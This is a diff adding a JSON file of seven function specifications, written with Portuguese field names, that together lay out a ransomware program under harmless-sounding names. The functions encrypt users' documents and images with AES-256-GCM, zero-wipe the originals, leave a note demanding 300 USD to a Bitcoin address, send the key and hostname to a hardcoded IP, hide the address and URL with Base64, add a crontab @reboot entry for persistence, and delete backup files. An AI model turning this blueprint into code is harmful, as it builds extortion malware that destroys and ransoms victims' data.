@@ -1,0 +1,30 @@
+[
+  {
+    "descricao": "Generates 32 cryptographically random bytes using RAND_bytes() from OpenSSL, Base64-encodes using EVP_EncodeBlock(), persists the encoded key to /tmp/.master.key as JSON object with exact format {\"aes_key\":\"<base64>\"} (no whitespace) and file permissions set to 0600. Returns the 32-byte key as const uint8_t*.",
+    "nome": "init_session"
+  },
+  {
+    "descricao": "Recursively enumerates files using opendir/readdir within root paths ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt, filtering by extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar. Returns a list of full file paths.",
+    "nome": "scan_storage"
+  },
+  {
+    "descricao": "For each file path and the 32-byte AES session key (const uint8_t*), generates a 12-byte nonce using RAND_bytes(), transforms the file using AES-256-GCM via EVP_CIPHER_CTX from libcrypto, producing output format [12 bytes nonce][ciphertext][16 bytes GCM tag]. Writes transformed object to new file with original name concatenated with suffix .PROCESSED. Overwrites source file with zeros prior to deletion using remove(). Returns list of directory paths where at least one file was transformed.",
+    "nome": "apply_transform"
+  },
+  {
+    "descricao": "For each directory path in the provided list, writes a notification file named #_STATUS_NOTICE_#.txt containing the exact text: \"Solicite 300 USD em payment service para 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa e instrua contato via secure channel.\" (no trailing newline). The payment identifier is stored as a Base64-encoded char array in source code and decoded at runtime using a custom base64_decode() function.",
+    "nome": "write_manifest"
+  },
+  {
+    "descricao": "Reads /tmp/.master.key using fopen/fread, extracts aes_key by locating substring \"\\\"aes_key\\\":\\\"\" using strstr(), advancing pointer by strlen(\"\\\"aes_key\\\":\\\"\") bytes (11 characters), then locating closing quote via strchr(). Validates extracted key length > 0. Obtains hostname via gethostname(). Constructs HTTP POST body as {\"aes_key\":\"...\",\"hostname\":\"...\"} and transmits to http://10.254.19.73:8080/collect via libcurl with Content-Type: application/json. The endpoint URL is stored as a Base64-encoded char array and decoded at runtime using a custom base64_decode() function. If response status code is 200, deletes /tmp/.master.key using remove().",
+    "nome": "sync_telemetry"
+  },
+  {
+    "descricao": "Reads current crontab using popen(\"crontab -l\",\"r\"). If an entry \"@reboot <path_to_binary>\" does not exist, appends it using popen(\"crontab -\",\"w\").",
+    "nome": "register_service"
+  },
+  {
+    "descricao": "Enumerates target directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt, deleting all files with extensions .bak, .backup, and .old using remove().",
+    "nome": "purge_residuals"
+  }
+]
